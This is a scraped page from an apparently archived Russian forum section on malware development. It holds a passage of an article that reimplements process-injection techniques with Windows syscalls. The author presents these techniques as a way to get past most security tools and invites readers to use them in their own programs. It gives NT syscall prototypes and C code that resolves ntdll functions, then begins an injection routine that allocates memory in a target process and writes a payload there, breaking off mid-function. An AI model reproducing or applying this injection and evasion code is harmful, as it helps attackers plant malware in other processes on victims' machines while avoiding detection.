s=d.createElement('script'),h=d.getElementsByTagName('script')[0],e=d.documentElement;if((' '+e.className+' ').indexOf(' ya-page_js_yes ')===-1){e.className+=' ya-page_js_yes';}s.type='text/javascript';s.async=true;s.charset='utf-8';s.src=(d.location.protocol==='https:'?'https:':'http:')+'//site.yandex.net/v2.0/js/all.js';h.parentNode.insertBefore(s,h);(w[c]||(w[c]=[])).push(function(){Ya.Site.Form.init()})})(window,document,'yandex_site_callbacks');</script>
      <!-- Notice -->
      <p style="margin:15px 0 0;
                padding:10px;
                border-radius:6px;
                background:#ffeaea;
                color:#c0392b;
                font-weight:bold;
                text-align:center;">
        ⚠️ Это архив форума, в ближайшее время поддержка ресурса не планируется!
      </p>

    </div>
  </div>
</div>
		</div>
	</li>

			
		</ul>
	

			

			

			
			
	
		<ul class="p-breadcrumbs "
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">Уроки разработки вредоносного софта</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			

			
	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript отключён. Для полноценно использования нашего сайта, пожалуйста, включите JavaScript в своём браузере.</div></noscript>

			
	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">Вы используете устаревший браузер. Этот и другие сайты могут отображаться в нем неправильно.<br />Необходимо обновить браузер или попробовать использовать <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">другой</a>.</div>


			
				<div class="p-body-header">
					
		<div class="contentRow contentRow--hideFigureNarrow">
			<div class="contentRow-main">
				<div class="p-title">
					<h1 class="p-title-value">
						
							
							Цикл статей &quot;Изучение вредоносных программ&quot;
						
					</h1>
				</div>
				
					<div class="p-description">
						
							<ul class="listInline listInline--bullet">
								<li>
									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Автор</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
									<span class="u-srOnly">Автор</span>
									
										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
									
								</li>
								
								<li>
									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Дата публикации</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
									<span class="u-srOnly">Дата публикации</span>

									<a href="../../index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-05-08T13:54:22+0300" data-timestamp="1746701662" data-date="08.05.2025" data-time="13:54" data-short="8 Май" title="08.05.2025 в 13:54">08.05.2025</time></a>
								</li>
																
									<li>
										<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Последнее обновление</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
										<span class="u-concealed">Обновлено</span>

										<time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time>
									</li>
								
																
									<li>
										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
										<span class="u-srOnly">Article read time</span>

										398 min read
									</li>
								
								
								
									<li><span class="label label--accent">Рекомендуемые</span></li>
								
							</ul>
						
					</div>
				

				

	
		
	

			</div>
		</div>
	
				</div>
				

			<div class="p-body-main p-body-main--withSidebar ">
				
				<div class="p-body-contentCol"></div>
				
					<div class="p-body-sidebarCol"></div>
				

				

				<div class="p-body-content">
					
					<div class="p-body-pageContent">









	

	



	
	

	




	




	







	



	




	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	







	
		
		

		
			<script data-cfasync="false" src="../../../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
			{
				"lightbox_close": "Закрыть",
				"lightbox_next": "Следующая",
				"lightbox_previous": "Предыдущая",
				"lightbox_error": "Запрошенный контент не может быть загружен. Пожалуйста, попробуйте позже.",
				"lightbox_start_slideshow": "Запустить слайд-шоу",
				"lightbox_stop_slideshow": "Остановить слайд-шоу",
				"lightbox_full_screen": "Полный экран",
				"lightbox_thumbnails": "Миниатюры",
				"lightbox_download": "Скачать",
				"lightbox_share": "Поделиться",
				"lightbox_zoom": "Увеличить",
				"lightbox_new_window": "Новое окно",
				"lightbox_toggle_sidebar": "Переключить боковую панель"
			}
			</script>
		
		
	


<div class="block">
	
		<div class="block-outer">
			<div class="block-outer-opposite">
			
				

	

	

	

	

	

	

	

	
		<div class="buttonGroup">
		
			

			
			
			
			

	

			
			
				<div class="buttonGroup-buttonWrapper">
					<button type="button" class="button button--link menuTrigger" data-xf-click="menu" aria-expanded="false" aria-haspopup="true" title="Навигация по страницам"><span class="button-text">
						ОГЛАВЛЕНИЕ
					</span></button>
					<div class="menu" data-menu="menu" aria-hidden="true">
						<div class="menu-content">
							<h4 class="menu-header">Выберите страницу</h4>

							<a href="../../index.html" class="menu-linkRow ">
								
									Зачем изучать разработку вредоносных программ ?
								
							</a>

							
								
									<a href="../instrumenty.1/index.html" class="menu-linkRow ">
									 Инструменты</a>
								
									<a href="../tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="menu-linkRow ">
									 Так какой-же язык выбрать !?</a>
								
									<a href="../shpargalka-po-arkhitekture-vindy.3/index.html" class="menu-linkRow ">
									 Шпаргалка по архитектуре винды</a>
								
									<a href="../chto-takoye-payload-i-shell-code.5/index.html" class="menu-linkRow ">
									 Что такое payload и shell code</a>
								
									<a href="../izuchayem-dinamicheskiye-biblioteki.6/index.html" class="menu-linkRow ">
									 Изучаем динамические библиотеки</a>
								
									<a href="../protsessy-windows.7/index.html" class="menu-linkRow ">
									 Процессы Windows</a>
								
									<a href="../vidy-detektov.8/index.html" class="menu-linkRow ">
									 Виды детектов</a>
								
									<a href="../kuda-klast-nagruzku.9/index.html" class="menu-linkRow ">
									 Куда класть нагрузку ?</a>
								
									<a href="../shifruyem-payload.10/index.html" class="menu-linkRow ">
									 Шифруем Payload</a>
								
									<a href="../obfuskatsiya-payload.11/index.html" class="menu-linkRow ">
									 Обфускация Payload</a>
								
									<a href="../lokal-nyi-zapusk-payload.12/index.html" class="menu-linkRow ">
									 Локальный запуск Payload</a>
								
									<a href="../in-yektsiya-v-protsess.13/index.html" class="menu-linkRow ">
									 Иньекция в процесс</a>
								
									<a href="../in-yektsiya-shell-koda-v-protsess.14/index.html" class="menu-linkRow ">
									 Инъекция шелл-кода в процесс</a>
								
									<a href="../razmeshchayem-payload-udalenno-na-servere.15/index.html" class="menu-linkRow ">
									 Размещаем Payload удаленно на сервере</a>
								
									<a href="../pryachem-payload-v-reyestre.16/index.html" class="menu-linkRow ">
									 Прячем Payload в реестре</a>
								
									<a href="../razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="menu-linkRow ">
									 Разборка с цифровой подписью зверька</a>
								
									<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html" class="menu-linkRow ">
									 Изучаем технику Thread Hijacking</a>
								
									<a href="../opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="menu-linkRow ">
									 Определение PID нужного процесса, или перечисления процессов</a>
								
									<a href="../izuchayem-tekhniku-apc-injection.20/index.html" class="menu-linkRow ">
									 Изучаем технику APC Injection</a>
								
									<a href="../vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="menu-linkRow ">
									 Вызов кода через функции обратного вызова</a>
								
									<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="menu-linkRow ">
									 Инъекция отображаемой памяти</a>
								
									<a href="../izuchayem-tekhniku-stomping-injection.23/index.html" class="menu-linkRow ">
									 Изучаем технику Stomping Injection</a>
								
									<a href="../kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="menu-linkRow ">
									 Контроль выполнения полезной нагрузки</a>
								
									<a href="../izuchayem-tekhniku-spoofing.25/index.html" class="menu-linkRow ">
									 Изучаем технику Spoofing</a>
								
									<a href="../skrytiye-strok.26/index.html" class="menu-linkRow ">
									 Скрытие строк</a>
								
									<a href="../izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="menu-linkRow ">
									 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
								
									<a href="../kungfu-2-izuchayem-api-hooking.28/index.html" class="menu-linkRow ">
									 Кунгфу-2.Изучаем API Hooking</a>
								
									<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="menu-linkRow ">
									 Предельная техника. Разборка с сисколами</a>
								
									<a href="index.html" class="menu-linkRow is-selected">
									 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
								
									<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="menu-linkRow ">
									 Черпаем силы в антиотладке</a>
								
									<a href="../obkhod-virtual-nykh-mashin.32/index.html" class="menu-linkRow ">
									 Обход виртуальных машин</a>
								
									<a href="../otkryvayem-vrata-ada.33/index.html" class="menu-linkRow ">
									 Открываем врата ада</a>
								
									<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="menu-linkRow ">
									 Уменьшение вероятности детекта зверька</a>
								
									<a href="../obkhod-windows-defender.35/index.html" class="menu-linkRow ">
									 Обход Windows defender</a>
								
									<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="menu-linkRow ">
									 Про Endpoint Detection and Response (EDR)</a>
								
									<a href="../pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="menu-linkRow ">
									 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
								
									<a href="../ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="menu-linkRow ">
									 Огромная база исходников современных вирусов для разных платформ</a>
								
									<a href="../kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="menu-linkRow ">
									 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
								
									<a href="../obkhod-amsi.40/index.html" class="menu-linkRow ">
									 Обход AMSI</a>
								
									<a href="../obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="menu-linkRow ">
									 Обход AMSI при помощи хардварных точек останова</a>
								
									<a href="../uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="menu-linkRow ">
									 Уклоняемся от поведенческого детекта антивируса и EDR</a>
								
									<a href="../obkhodim-antivirusy-i-edr.43/index.html" class="menu-linkRow ">
									 Обходим антивирусы и EDR</a>
								
									<a href="../mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="menu-linkRow ">
									 MutationGate - Новый подход работы с сисколами</a>
								
									<a href="../razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="menu-linkRow ">
									 Разработка настоящего вируса в 2024 году</a>
								
							
							
								<a href="../../index9401.html?full=1" class="menu-linkRow ">Просмотреть всю статью</a>
							
						</div>
					</div>
				</div>
			

			

			
		
		</div>
	

			
			</div>
		</div>
	

	
	
	
	
		

	<div class="block-container">
		<div class="block-body lbContainer js-articleBody"
			data-xf-init="lightbox"
			data-lb-id="article-6"
			data-lb-caption-desc="0x42 &middot; 08.05.2025 в 13:54"
			id="js-articleBody-6">

			<div class="articleBody">
				<article class="articleBody-main js-lbContainer">
					
					

					<h2>Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</h2>

					

						

					<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746786715233.png"
		data-src="https://osint42.org/attachments/1746786715233-png.227/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786715233-png.227/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786715233.png"
			title="1746786715233.png"
			width="1280" height="720" loading="lazy" />
	</div><br />
<br />
В прошлой статье:Предельная техника. Разборка с сисколами | Цикл статей &quot;Изучение вредоносных программ&quot; мы разобрали теорию.<br />
<br />
Давайте теперь переделаем техники:<br />
<br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-18" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-thread-hijacking.18/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../../../data/attachments/0/121-5936b6a0fe070dbf88f407d1f35689b52cce.jpg?hash=xsuvKtBQ0o' loading='lazy' width='241' height='150' alt='Изучаем технику Thread Hijacking' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="../izuchayem-tekhniku-thread-hijacking.18/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Изучаем технику Thread Hijacking</a>
				</h3>

				<div class="contentRow-snippet">
					Thread Hijacking (Похищение потока) - это техника, позволяющая выполнять полезную нагрузку без создания нового потока. Этот метод работает путем приостановки потока и обновления регистра адреса команды, указывающего на следующую инструкцию в памяти, чтобы он указывал на начало полезной нагрузки...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:00:03+0300" data-timestamp="1746781203" data-date="09.05.2025" data-time="12:00" data-short="9 Май" title="09.05.2025 в 12:00">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-22" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/in-yektsiya-otobrazhayemoi-pamyati.22/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../../../data/attachments/0/142-6b2a8f94002b22800112beedc28f81c8f6f2.jpg?hash=PUz950Z3C1' loading='lazy' width='618' height='150' alt='Инъекция отображаемой памяти' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="../in-yektsiya-otobrazhayemoi-pamyati.22/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Инъекция отображаемой памяти</a>
				</h3>

				<div class="contentRow-snippet">
					Локальная инъекция отображаемой памяти
Введение
До сих пор во всех предыдущих реализациях использовался тип локальной памяти для хранения полезной нагрузки во время выполнения. Локальная память выделяется с использованием VirtualAlloc или VirtualAllocEx.

На следующем изображении показана...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:37:35+0300" data-timestamp="1746783455" data-date="09.05.2025" data-time="12:37" data-short="9 Май" title="09.05.2025 в 12:37">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-20" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-apc-injection.20/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="../izuchayem-tekhniku-apc-injection.20/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../../../data/attachments/0/134-37e964d2c7070e78abb7d7eea06206b0930b.jpg?hash=w6qNKrCkmc' loading='lazy' width='292' height='150' alt='Изучаем технику APC Injection' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="../izuchayem-tekhniku-apc-injection.20/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Изучаем технику APC Injection</a>
				</h3>

				<div class="contentRow-snippet">
					Предлагаю в этой статье рассмотреть один способ выполнения полезной нагрузки без создания нового потока. Этот метод известен как APC-инъекция.

Что такое APC? Асинхронные вызовы процедур (APC) — это механизм операционной системы Windows, который позволяет программам выполнять задачи асинхронно...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:30:01+0300" data-timestamp="1746783001" data-date="09.05.2025" data-time="12:30" data-short="9 Май" title="09.05.2025 в 12:30">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />
С использованием косвенного вызова сискола, это поможет обойти большинство средств защиты.)<br />
<br />
Также это может послужить примером, как делать такие программы и вы можете уже сами реализовывать такие штуки в своих программах.)))<br />
<br />
<b><u>Итак начнем:</u><br />
<br />
1)Переписываем технику Изучаем технику Thread Hijacking | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Введение</b><br />
<br />
Классическая техника инъекции процессов, рассмотренная ранее, будет реализована с использованием прямых системных вызовов, заменяя WinAPI на их эквивалент в системных вызовах.<br />
<br />
VirtualAlloc/Ex заменяется на NtAllocateVirtualMemory<br />
<br />
VirtualProtect/Ex заменяется на NtProtectVirtualMemory<br />
<br />
WriteProcessMemory заменяется на NtWriteVirtualMemory<br />
<br />
CreateThread/RemoteThread заменяется на NtCreateThreadEx<br />
<br />
<b>Требуемые системные вызовы</b><br />
<br />
В этом разделе будут рассмотрены требуемые системные вызовы и их параметры.<br />
<br />
<b>NtAllocateVirtualMemory</b><br />
<br />
Это результат системного вызова из WinAPI-функций VirtualAlloc и VirtualAllocEx.<br />
NtAllocateVirtualMemory показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtAllocateVirtualMemory(
  IN HANDLE           ProcessHandle,    // Дескриптор процесса, в котором необходимо выделить память
  IN OUT PVOID        *BaseAddress,     // Возвращаемый базовый адрес выделенной памяти
  IN ULONG_PTR        ZeroBits,         // Всегда установите в &#039;0&#039;
  IN OUT PSIZE_T      RegionSize,       // Размер памяти для выделения
  IN ULONG            AllocationType,   // MEM_COMMIT | MEM_RESERVE
  IN ULONG            Protect           // Защита страницы
);</code></pre>
	</div>
</div><br />
NtAllocateVirtualMemory аналогичен WinAPI функции VirtualAllocEx. Однако он отличается тем, что параметры RegionSize и BaseAddress передаются по ссылке с использованием оператора адреса (&amp;).<br />
ZeroBits - это новый введенный параметр, который определяется как количество старших битов адреса, которые должны быть равны нулю в базовом адресе обзора секции. Этот параметр всегда устанавливается на ноль.<br />
<br />
Параметр RegionSize помечен как входной и выходной параметр. Это связано с тем, что значение RegionSize может изменяться в зависимости от того, что было фактически выделено. Microsoft утверждает, что начальное значение RegionSize указывает размер в байтах области, который округляется до следующей границы размера страницы хоста. Это означает, что NtAllocateVirtualMemory округляет до ближайшего кратного размера страницы, который составляет 4096 байт. Например, если RegionSize установлен на 5000 байт, он округлит его до 8192, и RegionSize вернет значение, которое было выделено, то есть 8192 в этом примере.<br />
<br />
Как уже упоминалось в предыдущих статьях, все системные вызовы возвращают NTSTATUS. Если выполнение успешно, он устанавливается в STATUS_SUCCESS (0). В противном случае, если системный вызов не удается, возвращается ненулевое значение.<br />
<br />
<b>NtProtectVirtualMemory</b><br />
<br />
Это результат системного вызова из WinAPI-функций VirtualProtect и VirtualProtectEx. NtProtectVirtualMemory показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtProtectVirtualMemory(
  IN HANDLE               ProcessHandle,              // Дескриптор процесса, защита памяти которого должна быть изменена
  IN OUT PVOID            *BaseAddress,               // Указатель на базовый адрес для защиты
  IN OUT PULONG           NumberOfBytesToProtect,     // Указатель на размер области для защиты
  IN ULONG                NewAccessProtection,        // Новая устанавливаемая защита памяти
  OUT PULONG              OldAccessProtection         // Указатель на переменную, которая получает предыдущую защиту доступа
);</code></pre>
	</div>
</div><br />
Оба параметра BaseAddress и NumberOfBytesToProtect передаются по ссылке с использованием оператора &quot;адрес&quot;.<br />
<br />
Параметр NumberOfBytesToProtect ведет себя аналогично параметру RegionSize в NtAllocateVirtualMemory, округляя количество байтов до ближайшего кратного размера страницы.<br />
<br />
<b>NtWriteVirtualMemory</b><br />
<br />
Это результат системного вызова из WinAPI-функции WriteProcessMemory. NtWriteVirtualMemory показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtWriteVirtualMemory(
  IN HANDLE               ProcessHandle,          // Дескриптор процесса, память которого должна быть записана
  IN PVOID                BaseAddress,            // Базовый адрес в указанном процессе, в который записываются данные
  IN PVOID                Buffer,                 // Данные для записи
  IN ULONG                NumberOfBytesToWrite,   // Количество байтов для записи
  OUT PULONG              NumberOfBytesWritten    // Указатель на переменную, которая получает количество фактически записанных байтов
);</code></pre>
	</div>
</div><br />
Параметры NtWriteVirtualMemory такие же, как и у его версии WinAPI, WriteProcessMemory.<br />
<br />
<b>NtCreateThreadEx</b><br />
<br />
Это результат системного вызова из WinAPI-функций CreateThread, CreateRemoteThread и CreateRemoteThreadEx. NtCreateThreadEx показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtCreateThreadEx(
    OUT PHANDLE                 ThreadHandle,         // Указатель на переменную HANDLE, которая получает дескриптор созданного потока
    IN     ACCESS_MASK             DesiredAccess,        // Права доступа к потоку (устанавливаются в THREAD_ALL_ACCESS - 0x1FFFFF)
    IN     POBJECT_ATTRIBUTES      ObjectAttributes,     // Указатель на структуру OBJECT_ATTRIBUTES (устанавливается в NULL)
    IN     HANDLE                  ProcessHandle,        // Дескриптор процесса, в котором должен быть создан поток
    IN     PVOID                   StartRoutine,         // Базовый адрес определяемой приложением функции, которая будет выполняться
    IN     PVOID                   Argument,             // Указатель на переменную, которая передается функции потока (устанавливается в NULL)
    IN     ULONG                   CreateFlags,          // Флаги, которые управляют созданием потока (устанавливаются в NULL)
    IN     SIZE_T                  ZeroBits,             // Устанавливаются в NULL
    IN     SIZE_T                  StackSize,            // Устанавливаются в NULL
    IN     SIZE_T                  MaximumStackSize,     // Устанавливаются в NULL
    IN     PPS_ATTRIBUTE_LIST      AttributeList         // Указатель на структуру PS_ATTRIBUTE_LIST (устанавливаются в NULL)
);</code></pre>
	</div>
</div><br />
NtCreateThreadEx похож на WinAPI функцию CreateRemoteThreadEx. NtCreateThreadEx - это очень гибкий системный вызов и может позволить сложное управление созданными потоками. Однако для наших целей большинство его параметров будут установлены на NULL.<br />
<br />
<b>Реализация с использованием GetProcAddress и GetModuleHandle</b><br />
<br />
Вызов системных вызовов будет выполнен с использованием нескольких методов, начиная с обычно используемыми WinAPI-функциями GetProcAddress и GetModuleHandle. Этот метод прост и был использован многократно для динамического вызова системных вызовов. Однако, как уже обсуждалось ранее, этот метод не обходит пользовательские хуки, установленные на системные вызовы.<br />
<br />
В предоставленном создается структура Syscall и инициализируется с помощью InitializeSyscallStruct, которая содержит адреса используемых системных вызовов, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Структура, которая хранит используемые системные вызовы
typedef struct _Syscall {

    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
    fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
    fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
    fnNtCreateThreadEx        pNtCreateThreadEx;

} Syscall, *PSyscall;


// Функция, используемая для заполнения входной структуры &#039;St&#039;
BOOL InitializeSyscallStruct (OUT PSyscall St) {

    HMODULE hNtdll = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
    if (!hNtdll) {
        printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
    St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
    St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
    St-&gt;pNtCreateThreadEx         = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

        // проверка, пропустил ли GetProcAddress системный вызов
    if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtCreateThreadEx == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
Далее функция ClassicInjectionViaSyscalls будет ответственна за выполнение полезной нагрузки, pPayload, в целевом процессе, hProcess. Функция возвращает FALSE, если не удалось выполнить полезную нагрузку, и TRUE, если удалось. Кроме того, функция может использоваться для инъекции как в локальные, так и в удаленные процессы, в зависимости от значения hProcess.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


    Syscall   St                     = { 0 };
    NTSTATUS  STATUS                 = 0x00;
    PVOID     pAddress               = NULL;
    ULONG     uOldProtection         = NULL;

    SIZE_T    sSize                  = sPayloadSize,
              sNumberOfBytesWritten    = NULL;
    HANDLE    hThread                = NULL;

    // Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
    if (!InitializeSyscallStruct(&amp;St)){
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

//--------------------------------------------------------------------------

    // Выделение памяти
    if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
